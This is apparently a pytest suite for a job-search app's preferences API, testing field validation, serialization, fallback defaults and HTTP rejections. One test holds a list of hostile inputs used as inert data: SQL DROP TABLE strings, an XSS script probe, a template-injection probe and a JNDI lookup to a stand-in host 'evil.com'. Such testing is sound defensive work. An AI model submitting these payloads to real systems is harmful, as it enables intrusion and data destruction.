"""Adversarial stress-test suite for Preferences Configuration & Persistence (R1).

Verifies:
1. Boundary freshness values (1, 4, 8, 12, 16, 24) and rejection of invalid values (0, 25, -5, 100, 2, 7, etc.).
2. Match threshold boundary values (0, 100) and rejection of out-of-range (<0, >100).
3. Experience level tiers (FRESHER, 0_1, 1_2, 2_3, 3_PLUS, ALL) and rejection of unknown strings.
4. Serialization/deserialization with empty lists, unicode strings, long lists, and injection strings.
5. Fallback behavior when preferences are missing, partial, or corrupted.
"""

import uuid
from datetime import datetime, timezone
import pytest
from pydantic import ValidationError
from httpx import AsyncClient, ASGITransport
from unittest.mock import AsyncMock, patch

from app.main import app
from app.database import get_db
from app.models.preference import Preference
from app.models.user import User
from app.schemas.preference import (
    PreferenceUpdate,
    PreferenceResponse,
    ALLOWED_FRESHNESS,
    ALLOWED_EXPERIENCE,
    ALLOWED_ROLE_TYPES,
    ALLOWED_SOURCE_BOARDS,
)
from app.api.v1.preferences import _to_preference_response
from app.services.preference_service import update_preferences


# ==============================================================================
# 1. Adversarial Freshness Boundary & Validation Tests
# ==============================================================================

@pytest.mark.parametrize("valid_hours", [1, 4, 8, 12, 16, 24])
def test_freshness_boundary_valid_values(valid_hours):
    """Verify all 6 discrete freshness values are accepted."""
    update = PreferenceUpdate(freshness_hours=valid_hours)
    assert update.freshness_hours == valid_hours


@pytest.mark.parametrize("invalid_hours", [
    0,       # Lower boundary violation
    25,      # Upper boundary violation
    -5,      # Negative number
    -1,      # Negative boundary
    100,     # Out-of-bounds large integer
    2,       # Non-discrete intermediate
    3,       # Non-discrete intermediate
    5,       # Non-discrete intermediate
    7,       # Non-discrete intermediate
    10,      # Non-discrete intermediate
    48,      # Valid in some job boards, but invalid in R1 discrete contract
    168,     # 1 week: out of discrete allowed set
    999999,  # Huge integer
])
def test_freshness_boundary_invalid_values_rejected(invalid_hours):
    """Verify out-of-bounds and non-discrete freshness values raise ValidationError."""
    with pytest.raises(ValidationError) as exc_info:
        PreferenceUpdate(freshness_hours=invalid_hours)
    errors = exc_info.value.errors()
    assert any("freshness_hours" in str(e["loc"]) for e in errors)


# ==============================================================================
# 2. Adversarial Match Threshold Boundary & Validation Tests
# ==============================================================================

@pytest.mark.parametrize("valid_thresh", [0, 1, 50, 99, 100])
def test_match_threshold_boundary_valid_values(valid_thresh):
    """Verify boundary (0, 100) and interior threshold values are accepted."""
    update = PreferenceUpdate(match_threshold=valid_thresh)
    assert update.match_threshold == valid_thresh


@pytest.mark.parametrize("invalid_thresh", [
    -1,      # Just below lower bound 0
    -5,      # Arbitrary negative
    -100,    # Large negative
    101,     # Just above upper bound 100
    150,     # Out of range
    200,     # Double maximum
    100000,  # Extreme number
])
def test_match_threshold_out_of_range_rejected(invalid_thresh):
    """Verify out-of-range match threshold values raise ValidationError."""
    with pytest.raises(ValidationError) as exc_info:
        PreferenceUpdate(match_threshold=invalid_thresh)
    errors = exc_info.value.errors()
    assert any("match_threshold" in str(e["loc"]) for e in errors)


# ==============================================================================
# 3. Adversarial Experience Level Tiers & Unknown String Tests
# ==============================================================================

@pytest.mark.parametrize("valid_tier", ["FRESHER", "0_1", "1_2", "2_3", "3_PLUS", "ALL"])
def test_experience_level_all_valid_tiers(valid_tier):
    """Verify all 6 valid experience level tiers are accepted."""
    update = PreferenceUpdate(experience_level=valid_tier)
    assert update.experience_level == valid_tier


@pytest.mark.parametrize("case_variant, expected", [
    ("fresher", "FRESHER"),
    ("0_1", "0_1"),
    ("1_2", "1_2"),
    ("2_3", "2_3"),
    ("3_plus", "3_PLUS"),
    ("all", "ALL"),
    ("FrEsHeR", "FRESHER"),
    ("3_Plus", "3_PLUS"),
])
def test_experience_level_case_insensitivity(case_variant, expected):
    """Verify experience level is normalized to uppercase."""
    update = PreferenceUpdate(experience_level=case_variant)
    assert update.experience_level == expected


@pytest.mark.parametrize("unknown_tier", [
    "SENIOR",
    "MID",
    "10_YEARS",
    "LEAD",
    "STAFF",
    "PRINCIPAL",
    "INTERN",       # Role type, not experience tier
    "",             # Empty string
    "   ",          # Whitespace
    "FRESH",        # Truncated
    "3PLUS",        # Missing underscore
    "0-1",          # Dash instead of underscore
    "EXPERT",
])
def test_experience_level_unknown_strings_rejected(unknown_tier):
    """Verify unknown experience level strings raise ValidationError."""
    with pytest.raises(ValidationError) as exc_info:
        PreferenceUpdate(experience_level=unknown_tier)
    errors = exc_info.value.errors()
    assert any("experience_level" in str(e["loc"]) for e in errors)


# ==============================================================================
# 4. Serialization / Deserialization: Empty Lists, Unicode, Long Lists & Injections
# ==============================================================================

def test_serialization_empty_lists():
    """Verify serialization and deserialization with empty lists."""
    update = PreferenceUpdate(
        preferred_locations=[],
        excluded_companies=[],
        source_boards=[],
        priority_companies=[],
    )
    dumped = update.model_dump()
    assert dumped["preferred_locations"] == []
    assert dumped["excluded_companies"] == []
    assert dumped["source_boards"] == []
    assert dumped["priority_companies"] == []

    restored = PreferenceUpdate.model_validate(dumped)
    assert restored.preferred_locations == []
    assert restored.excluded_companies == []
    assert restored.source_boards == []


def test_serialization_unicode_and_special_characters():
    """Verify serialization and deserialization with international unicode characters."""
    unicode_locations = [
        "Bengaluru 🇮🇳",
        "München 🇩🇪",
        "東京 🇯🇵",
        "São Paulo 🇧🇷",
        "Zürich 🇨🇭",
        "Санкт-Петербург 🇷🇺",
        "القاهرة 🇪🇬",
    ]
    unicode_companies = [
        "Société Générale",
        "Häagen-Dazs IT",
        "Компания «Яндекс»",
        "任天堂株式会社",
        "🚀 MoonRocket Ventures",
        "Tata Consultancy Services & Co.",
        "Müller & Schmidt GmbH",
    ]

    update = PreferenceUpdate(
        preferred_locations=unicode_locations,
        excluded_companies=unicode_companies,
    )
    dumped = update.model_dump()
    restored = PreferenceUpdate.model_validate(dumped)

    assert restored.preferred_locations == unicode_locations
    assert restored.excluded_companies == unicode_companies


def test_serialization_injection_and_metacharacter_safety():
    """Verify SQL injection, XSS, and JSON delimiter strings are preserved verbatim without corruption."""
    malicious_payloads = [
        "'; DROP TABLE preferences; --",
        "<script>alert('xss')</script>",
        "\"}{\"injected\": true}",
        "Robert'); DROP TABLE Students;--",
        "{{ 7 * 7 }}",
        "${jndi:ldap://evil.com/x}",
        "\n\r\t\0",
    ]

    update = PreferenceUpdate(
        preferred_locations=malicious_payloads,
        excluded_companies=malicious_payloads,
    )
    dumped = update.model_dump()
    restored = PreferenceUpdate.model_validate(dumped)

    assert restored.preferred_locations == malicious_payloads
    assert restored.excluded_companies == malicious_payloads


def test_serialization_large_stress_lists():
    """Verify large lists (1,000 items) serialize and deserialize cleanly without truncation."""
    large_locs = [f"Location_{i}_{uuid.uuid4().hex[:6]}" for i in range(1000)]
    large_excluded = [f"ExcludedCorp_{i}_{uuid.uuid4().hex[:6]}" for i in range(1000)]

    update = PreferenceUpdate(
        preferred_locations=large_locs,
        excluded_companies=large_excluded,
    )
    dumped = update.model_dump()
    restored = PreferenceUpdate.model_validate(dumped)

    assert len(restored.preferred_locations) == 1000
    assert len(restored.excluded_companies) == 1000
    assert restored.preferred_locations[999] == large_locs[999]
    assert restored.excluded_companies[999] == large_excluded[999]


def test_preference_response_full_roundtrip_with_unicode_and_boundaries():
    """Verify PreferenceResponse serialization roundtrip with edge-case values."""
    pid = uuid.uuid4()
    uid = uuid.uuid4()
    now = datetime.now(timezone.utc)

    resp = PreferenceResponse(
        id=pid,
        user_id=uid,
        freshness_hours=1,                  # Min boundary
        experience_max_years=0,
        experience_level="FRESHER",
        match_threshold=0,                  # Min boundary 0%
        preferred_locations=["München 🇩🇪"],
        role_type="INTERNSHIPS",
        source_boards=["INDEED"],
        preferred_technologies=["Rust 🦀"],
        preferred_industries=["Deep Tech"],
        priority_companies=["OpenAI"],
        excluded_companies=["SpamAgency GmbH"],
        sync_interval_hours=1,
        auto_sync_enabled=False,
        last_auto_sync_at=now,
        setup_completed=True,
        updated_at=now,
    )

    dumped = resp.model_dump(mode="json")
    assert dumped["freshness_hours"] == 1
    assert dumped["match_threshold"] == 0
    assert dumped["preferred_locations"] == ["München 🇩🇪"]

    restored = PreferenceResponse.model_validate(dumped)
    assert restored.freshness_hours == 1
    assert restored.match_threshold == 0
    assert restored.preferred_locations == ["München 🇩🇪"]


# ==============================================================================
# 5. Adversarial Fallback & Corruption Behavior
# ==============================================================================

def test_to_preference_response_fallback_on_null_and_corrupted_model_fields():
    """Verify _to_preference_response safely falls back when DB columns contain None or missing values."""
    class CorruptedPref:
        id = uuid.uuid4()
        user_id = uuid.uuid4()
        freshness_hours = None           # None in DB
        experience_max_years = None      # None in DB
        experience_level = None          # None in DB
        preferred_locations = None       # None in DB
        role_type = None                 # None in DB
        source_boards = None             # None in DB
        preferred_technologies = None
        preferred_industries = None
        priority_companies = None
        excluded_companies = None        # None in DB
        match_threshold = None           # None in DB
        sync_interval_hours = None
        auto_sync_enabled = None
        last_auto_sync_at = None
        ai_provider = None
        ai_model = None
        ai_base_url = None
        ai_api_key = None
        ai_fallback_provider = None
        ai_fallback_model = None
        ai_provider_config = None
        setup_completed = None
        updated_at = None

    resp = _to_preference_response(CorruptedPref())

    # Verify fallbacks are safely populated
    assert resp.freshness_hours == 24
    assert resp.experience_max_years == 2
    assert resp.experience_level == "ALL"
    assert resp.match_threshold == 60
    assert resp.preferred_locations == []
    assert resp.role_type == "ALL"
    assert resp.source_boards == ["LINKEDIN", "NAUKRI", "INTERNSHALA"]
    assert resp.excluded_companies == []
    assert resp.setup_completed is False


def test_to_preference_response_boundary_zero_match_threshold_preserved():
    """Verify match_threshold=0 is NOT replaced by the default 60 (falsy zero pitfall)."""
    class ZeroThresholdPref:
        id = uuid.uuid4()
        user_id = uuid.uuid4()
        freshness_hours = 4
        experience_max_years = 0
        experience_level = "FRESHER"
        preferred_locations = []
        role_type = "JOBS"
        source_boards = ["LINKEDIN"]
        preferred_technologies = []
        preferred_industries = []
        priority_companies = []
        excluded_companies = []
        match_threshold = 0              # CRITICAL: 0 is falsy, but valid threshold
        sync_interval_hours = 24
        auto_sync_enabled = True
        last_auto_sync_at = None
        ai_provider = None
        ai_model = None
        ai_base_url = None
        ai_api_key = None
        ai_fallback_provider = None
        ai_fallback_model = None
        ai_provider_config = {}
        setup_completed = False
        updated_at = datetime.now(timezone.utc)

    resp = _to_preference_response(ZeroThresholdPref())
    assert resp.match_threshold == 0  # Must be 0, NOT 60!


@pytest.mark.asyncio
async def test_update_preferences_partial_update_preserves_unmodified_fields():
    """Verify partial PreferenceUpdate does not overwrite unspecified fields with None."""
    user_id = uuid.uuid4()
    mock_db = AsyncMock()

    existing_pref = Preference(
        id=uuid.uuid4(),
        user_id=user_id,
        freshness_hours=12,
        experience_level="2_3",
        match_threshold=85,
        preferred_locations=["Bengaluru"],
        role_type="JOBS",
        source_boards=["LINKEDIN"],
        excluded_companies=["BadCorp"],
    )

    from unittest.mock import MagicMock
    mock_result = MagicMock()
    mock_result.scalar_one_or_none.return_value = existing_pref
    mock_db.execute.return_value = mock_result

    # Send only match_threshold in update
    partial_update = PreferenceUpdate(match_threshold=95)
    updated = await update_preferences(mock_db, user_id, partial_update)

    assert updated.match_threshold == 95
    # All other fields must remain unchanged
    assert updated.freshness_hours == 12
    assert updated.experience_level == "2_3"
    assert updated.preferred_locations == ["Bengaluru"]
    assert updated.role_type == "JOBS"
    assert updated.source_boards == ["LINKEDIN"]
    assert updated.excluded_companies == ["BadCorp"]


# ==============================================================================
# 6. HTTP API Adversarial Request Tests (PUT /api/v1/preferences)
# ==============================================================================

@pytest.mark.asyncio
async def test_api_put_preferences_adversarial_rejections():
    """Verify FastAPI route rejects invalid payloads with 422 Unprocessable Entity."""
    mock_db = AsyncMock()
    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # 1. Invalid freshness (0, 25, -5, 100)
            for bad_h in [0, 25, -5, 100]:
                res = await client.put("/api/v1/preferences", json={"freshness_hours": bad_h})
                assert res.status_code == 422, f"Expected 422 for freshness_hours={bad_h}, got {res.status_code}"

            # 2. Out-of-bounds match threshold (<0, >100)
            for bad_th in [-1, -50, 101, 200]:
                res = await client.put("/api/v1/preferences", json={"match_threshold": bad_th})
                assert res.status_code == 422, f"Expected 422 for match_threshold={bad_th}, got {res.status_code}"

            # 3. Unknown experience levels
            for bad_exp in ["SENIOR", "MID", "10_YEARS", "UNKNOWN"]:
                res = await client.put("/api/v1/preferences", json={"experience_level": bad_exp})
                assert res.status_code == 422, f"Expected 422 for experience_level={bad_exp}, got {res.status_code}"

            # 4. Unknown source board
            res = await client.put("/api/v1/preferences", json={"source_boards": ["LINKEDIN", "MONSTER"]})
            assert res.status_code == 422

            # 5. Invalid role type
            res = await client.put("/api/v1/preferences", json={"role_type": "FREELANCE"})
            assert res.status_code == 422
    finally:
        app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_api_put_preferences_adversarial_valid_boundaries():
    """Verify FastAPI route accepts boundary values and unicode strings with 200 OK."""
    user_id = uuid.uuid4()
    mock_user = User(id=user_id, email="challenger@example.com")

    mock_db = AsyncMock()
    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # Test valid boundary payload: freshness=1, threshold=0
            boundary_pref = Preference(
                id=uuid.uuid4(),
                user_id=user_id,
                freshness_hours=1,
                experience_level="FRESHER",
                match_threshold=0,
                preferred_locations=["München 🇩🇪", "東京 🇯🇵"],
                role_type="INTERNSHIPS",
                source_boards=["LINKEDIN", "INDEED"],
                excluded_companies=["Société Générale"],
                updated_at=datetime.now(timezone.utc),
            )

            with patch("app.api.v1.preferences.get_or_create_default_user", new_callable=AsyncMock) as mock_get_user, \
                 patch("app.api.v1.preferences.update_preferences", new_callable=AsyncMock) as mock_update:
                mock_get_user.return_value = mock_user
                mock_update.return_value = boundary_pref

                payload = {
                    "freshness_hours": 1,
                    "experience_level": "FRESHER",
                    "match_threshold": 0,
                    "preferred_locations": ["München 🇩🇪", "東京 🇯🇵"],
                    "role_type": "INTERNSHIPS",
                    "source_boards": ["LINKEDIN", "INDEED"],
                    "excluded_companies": ["Société Générale"],
                }

                res = await client.put("/api/v1/preferences", json=payload)
                assert res.status_code == 200
                data = res.json()
                assert data["freshness_hours"] == 1
                assert data["match_threshold"] == 0
                assert data["experience_level"] == "FRESHER"
                assert "München 🇩🇪" in data["preferred_locations"]
                assert "Société Générale" in data["excluded_companies"]
    finally:
        app.dependency_overrides.clear()
